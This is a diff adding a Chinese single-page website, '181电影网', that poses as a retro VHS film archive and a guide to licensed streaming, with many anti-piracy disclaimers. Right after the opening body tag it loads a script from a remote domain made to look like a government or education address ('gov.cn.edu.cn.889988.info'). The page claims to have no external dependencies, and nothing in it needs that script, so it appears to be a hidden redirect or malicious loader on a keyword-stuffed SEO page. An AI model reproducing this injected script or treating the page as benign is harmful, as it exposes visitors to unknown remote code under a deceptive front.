@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>181电影网：VHS录像带档案、频道分类与正版观影指南｜181dianyingwang-top.github.io</title>
+<meta name="description" content="181电影网整理181号录像带档案，提供动作、喜剧、科幻、悬疑等频道分类与正版观看渠道。本站仅作复古影视资料站，不提供盗版播放与下载。访问 181dianyingwang-top.github.io 获取卡带电影资料。">
+<meta name="keywords" content="181电影网, VHS录像带档案, 电影频道分类, 正版观影指南, 复古影视资料, 动作喜剧科幻, 181dianyingwang">
+<meta name="author" content="181电影网档案组">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="msvalidate.01" content="181BING20241010X1">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+background:#080812;
+color:#00ffcc;
+font-family:"Courier New",Courier,monospace;
+line-height:1.6;
+overflow-x:hidden;
+position:relative;
+}
+/* 扫描线效果 */
+body::after{
+content:"";
+position:fixed;
+top:0;left:0;width:100%;height:100%;
+background:linear-gradient(rgba(18,16,16,0) 50%,rgba(0,0,0,0.25) 50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06));
+background-size:100% 4px, 3px 100%;
+pointer-events:none;
+z-index:999;
+}
+.wrap{width:min(1100px,100%);margin:0 auto;padding:0 20px;position:relative;z-index:10}
+
+/* 电视顶部 */
+.tv-top{background:#111;padding:12px 0;border-bottom:3px solid #333;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
+.tv-screen{background:#000;border:4px solid #222;border-radius:8px 8px 0 0;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;width:100%;max-width:800px;margin:0 auto}
+.channel-disp{font-size:18px;color:#ff0066;font-weight:bold;text-shadow:0 0 5px #ff0066}
+.power-led{width:10px;height:10px;background:#00ff00;border-radius:50%;box-shadow:0 0 8px #00ff00;animation:blink 2s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* 标题区 */
+.header{padding:30px 0 20px;text-align:center}
+.header h1{font-size:42px;color:#fff;text-shadow:0 0 10px #00ffcc,0 0 20px #00ffcc;margin-bottom:10px;letter-spacing:2px}
+.header h1 span{color:#ff0066;text-shadow:0 0 10px #ff0066}
+.domain-bar{background:#111;border:1px solid #00ffcc;padding:10px;font-size:14px;color:#00ffcc;display:inline-block;margin-bottom:15px;word-break:break-all}
+.domain-bar::before{content:"📼 URL: "}
+
+/* 遥控器导航 */
+.remote{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-bottom:30px}
+.remote a{
+background:#1a1a2e;
+border:2px solid #ff0066;
+color:#ff0066;
+padding:10px 18px;
+font-size:13px;
+font-weight:bold;
+text-transform:uppercase;
+box-shadow:0 4px 0 #4a0033;
+transition:.1s;
+}
+.remote a:hover{background:#ff0066;color:#fff;transform:translateY(2px);box-shadow:0 2px 0 #4a0033}
+
+/* 栏目 */
+.section{margin-bottom:50px}
+.sec-head{display:flex;align-items:center;gap:10px;margin-bottom:20px;border-bottom:2px dashed #00ffcc;padding-bottom:8px}
+.sec-icon{font-size:24px}
+.sec-head h2{font-size:22px;color:#fff;letter-spacing:1px}
+.sec-head .freq{margin-left:auto;font-size:12px;color:#ff0066;background:#111;padding:4px 8px;border:1px solid #ff0066}
+
+/* 卡带网格 */
+.cassettes{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:20px}
+.tape{
+background:#1a1a2e;
+border:2px solid #333;
+border-radius:8px;
+padding:15px;
+position:relative;
+overflow:hidden;
+transition:.3s;
+}
+.tape:hover{border-color:#00ffcc;transform:scale(1.02)}
+.tape-label{background:#f0e68c;color:#000;padding:10px;margin-bottom:15px;border-radius:4px;border:1px solid #ccc;min-height:80px}
+.tape-label h3{font-size:14px;font-weight:bold;margin-bottom:5px;font-family:"Microsoft YaHei",sans-serif}
+.tape-label .num{font-size:11px;color:#666;font-family:"Courier New",monospace}
+.tape-window{background:#222;height:40px;border-radius:4px;margin-bottom:15px;display:flex;align-items:center;justify-content:center;gap:10px}
+.reel{width:30px;height:30px;border:3px solid #555;border-radius:50%;animation:spin 4s linear infinite}
+.reel:nth-child(2){border-color:#ff0066}
+@keyframes spin{100%{transform:rotate(360deg)}}
+.tape-info{font-size:12px;color:#aaa;margin-bottom:8px}
+.tape-legal{font-size:11px;color:#00ffcc;font-weight:bold}
+
+/* 频道分类 */
+.channels{display:grid;grid-template-columns:repeat(3,1fr);gap:15px}
+.ch{background:#0d0d1a;border:1px solid #333;padding:15px;border-left:4px solid #ff0066}
+.ch h3{font-size:16px;color:#fff;margin-bottom:8px}
+.ch p{font-size:12px;color:#888;font-family:"Microsoft YaHei",sans-serif}
+.ch-num{font-size:24px;color:#ff0066;font-weight:bold;float:right}
+
+/* 播放指南 */
+.guide{background:#111;border:1px solid #00ffcc;padding:20px;border-radius:8px}
+.guide h3{color:#00ffcc;margin-bottom:15px;font-size:16px}
+.guide-item{display:flex;gap:15px;margin-bottom:12px;align-items:flex-start}
+.guide-item .step{background:#ff0066;color:#fff;width:24px;height:24px;display:flex;align-items:center;justify-content:center;border-radius:50%;flex-shrink:0;font-size:12px}
+.guide-item p{font-size:13px;color:#ccc;font-family:"Microsoft YaHei",sans-serif}
+.guide-item b{color:#00ffcc}
+
+/* 系统信息 */
+.system{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.sys-box{background:#0d0d1a;border:1px solid #333;padding:15px}
+.sys-box h3{color:#ff0066;margin-bottom:10px;font-size:14px}
+.sys-box p{font-size:12px;color:#aaa;margin-bottom:8px;font-family:"Microsoft YaHei",sans-serif}
+.sys-url{background:#000;border:1px solid #00ffcc;padding:10px;font-size:12px;color:#00ffcc;word-break:break-all;margin-top:10px}
+
+/* 页脚 */
+footer{background:#111;padding:30px 20px;border-top:2px solid #333;margin-top:50px;text-align:center}
+.foot-nav{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-bottom:15px}
+.foot-nav a{font-size:11px;color:#00ffcc;border:1px solid #333;padding:5px 10px}
+.foot-nav a:hover{background:#00ffcc;color:#000}
+.credit{font-size:10px;color:#555}
+
+@media(max-width:768px){
+.header h1{font-size:28px}
+.channels{grid-template-columns:1fr}
+.system{grid-template-columns:1fr}
+.cassettes{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="tv-top">
+<div class="tv-screen">
+<span class="channel-disp">CH 181</span>
+<span class="power-led"></span>
+</div>
+</div>
+
+<div class="wrap">
+<header class="header">
+<h1>181电影网<span>录像带档案</span></h1>
+<div class="domain-bar">https://181dianyingwang-top.github.io</div>
+<p style="color:#aaa;font-size:13px">复古VHS电影资料库，提供动作、喜剧、科幻、悬疑等频道分类与正版观看指南</p>
+</header>
+
+<nav class="remote">
+<a href="#tapes">📼 录像带库存</a>
+<a href="#channels">📺 频道分类</a>
+<a href="#guide">🔧 播放指南</a>
+<a href="#system">⚙️ 系统信息</a>
+</nav>
+
+<main>
+<section class="section" id="tapes">
+<div class="sec-head">
+<span class="sec-icon">📼</span>
+<h2>录像带库存 (Cassette Inventory)</h2>
+<span class="freq">FREQ: 181.0 MHz</span>
+</div>
+<div class="cassettes">
+<div class="tape">
+<div class="tape-label">
+<h3>181-001: 午夜追捕令</h3>
+<span class="num">CAT: ACT-001</span>
+</div>
+<div class="tape-window">
+<div class="reel"></div>
+<div class="reel"></div>
+</div>
+<div class="tape-info">动作/犯罪 | 112分钟 | 适看15+</div>
+<div class="tape-legal">正版: 平台动作专区可查</div>
+</div>
+<div class="tape">
+<div class="tape-label">
+<h3>181-002: 太空漫游指南</h3>
+<span class="num">CAT: SCI-002</span>
+</div>
+<div class="tape-window">
+<div class="reel"></div>
+<div class="reel"></div>
+</div>
+<div class="tape-info">科幻/冒险 | 138分钟 | 适看12+</div>
+<div class="tape-legal">正版: 公映科幻片可查</div>
+</div>
+<div class="tape">
+<div class="tape-label">
+<h3>181-003: 咖啡馆奇遇</h3>
+<span class="num">CAT: ROM-003</span>
+</div>
+<div class="tape-window">
+<div class="reel"></div>
+<div class="reel"></div>
+</div>
+<div class="tape-info">喜剧/爱情 | 96分钟 | 适看10+</div>
+<div class="tape-legal">正版: 喜剧免费专区可查</div>
+</div>
+<div class="tape">
+<div class="tape-label">
+<h3>181-004: 古宅谜踪</h3>
+<span class="num">CAT: MYS-004</span>
+</div>
+<div class="tape-window">
+<div class="reel"></div>
+<div class="reel"></div>
+</div>
+<div class="tape-info">悬疑/惊悚 | 105分钟 | 适看14+</div>
+<div class="tape-legal">正版: 悬疑会员专区可查</div>
+</div>
+<div class="tape">
+<div class="tape-label">
+<h3>181-005: 深海巨兽</h3>
+<span class="num">CAT: DOC-005</span>
+</div>
+<div class="tape-window">
+<div class="reel"></div>
+<div class="reel"></div>
+</div>
+<div class="tape-info">纪录/自然 | 88分钟 | 适看6+</div>
+<div class="tape-legal">正版: 纪录片频道可查</div>
+</div>
+<div class="tape">
+<div class="tape-label">
+<h3>181-006: 摇滚校园</h3>
+<span class="num">CAT: MUS-006</span>
+</div>
+<div class="tape-window">
+<div class="reel"></div>
+<div class="reel"></div>
+</div>
+<div class="tape-info">音乐/青春 | 102分钟 | 适看8+</div>
+<div class="tape-legal">正版: 音乐电影专区可查</div>
+</div>
+</div>
+</section>
+
+<section class="section" id="channels">
+<div class="sec-head">
+<span class="sec-icon">📺</span>
+<h2>频道分类 (Channel Categories)</h2>
+<span class="freq">FREQ: 181.5 MHz</span>
+</div>
+<div class="channels">
+<div class="ch">
+<span class="ch-num">CH1</span>
+<h3>动作频道</h3>
+<p>警匪、格斗、赛车、救援类影片，强调团队协作与正义执行，无过度暴力渲染。</p>
+</div>
+<div class="ch">
+<span class="ch-num">CH2</span>
+<h3>喜剧频道</h3>
+<p>家庭喜剧、职场轻喜剧、误会笑料，筛选无低俗梗，适合全家观看。</p>
+</div>
+<div class="ch">
+<span class="ch-num">CH3</span>
+<h3>科幻频道</h3>
+<p>太空探索、时间旅行、AI伦理，注重科学逻辑与人文思考。</p>
+</div>
+<div class="ch">
+<span class="ch-num">CH4</span>
+<h3>悬疑频道</h3>
+<p>本格推理、社会派案件、心理惊悚，重逻辑轻血腥，适合解谜爱好者。</p>
+</div>
+<div class="ch">
+<span class="ch-num">CH5</span>
+<h3>纪录频道</h3>
+<p>自然、历史、科技、社会纪实，提供公共教育资源与正版观看渠道。</p>
+</div>
+<div class="ch">
+<span class="ch-num">CH6</span>
+<h3>文艺频道</h3>
+<p>独立电影、作者电影、慢节奏生活片，适合深度观影与讨论。</p>
+</div>
+</div>
+</section>
+
+<section class="section" id="guide">
+<div class="sec-head">
+<span class="sec-icon">🔧</span>
+<h2>播放指南 (Playback Guide)</h2>
+<span class="freq">FREQ: 182.0 MHz</span>
+</div>
+<div class="guide">
+<h3>如何获取正版影片</h3>
+<div class="guide-item">
+<span class="step">1</span>
+<p>选择影片后，查看卡带标签上的<b>正版提示</b>，前往对应平台免费专区或会员专区。</p>
+</div>
+<div class="guide-item">
+<span class="step">2</span>
+<p>优先使用<b>官方影视平台</b>：腾讯视频、爱奇艺、优酷、芒果TV、B站放映厅等。</p>
+</div>
+<div class="guide-item">
+<span class="step">3</span>
+<p>经典老片可查询<b>电影频道</b>(CCTV6)官网或1905电影网正版资源。</p>
+</div>
+<div class="guide-item">
+<span class="step">4</span>
+<p>纪录片与教育资源可访问<b>央视网</b>、<b>学习强国</b>等官方平台。</p>
+</div>
+<div class="guide-item">
+<span class="step">5</span>
+<p>本站不提供任何盗版解析、网盘下载或第三方播放源，请支持正版。</p>
+</div>
+</div>
+</section>
+
+<section class="section" id="system">
+<div class="sec-head">
+<span class="sec-icon">⚙️</span>
+<h2>系统信息 (System Info)</h2>
+<span class="freq">FREQ: 182.5 MHz</span>
+</div>
+<div class="system">
+<div class="sys-box">
+<h3>收录规则</h3>
+<p>1. 本站为静态单页，CSS内嵌，符合必应收录规范。</p>
+<p>2. 所有影片资料仅作推荐，不提供盗版播放与下载。</p>
+<p>3. 移动端自适应，标签闭合完整，无外部依赖。</p>
+<p>4. 内页链接统一用#占位，便于后续扩展。</p>
+</div>
+<div class="sys-box">
+<h3>站点根域</h3>
+<p>181电影网唯一官方地址：</p>
+<div class="sys-url">https://181dianyingwang-top.github.io</div>
+<p style="margin-top:10px">关键词：181电影网</p>
+<p>定位：复古录像带档案、频道分类、正版观影指南</p>
+</div>
+</div>
+</section>
+</main>
+</div>
+
+<footer>
+<div class="wrap">
+<nav class="foot-nav">
+<a href="#tapes">录像带库存</a>
+<a href="#channels">频道分类</a>
+<a href="#guide">播放指南</a>
+<a href="#system">系统信息</a>
+</nav>
+<div class="credit">
+181电影网 关键词：181电影网｜站点：https://181dianyingwang-top.github.io<br>
+© 2024 181电影网档案组 仅提供电影资料与正版观看指南，不提供盗版播放与下载。
+</div>
+</div>
+</footer>
+
+</body>
+</html>
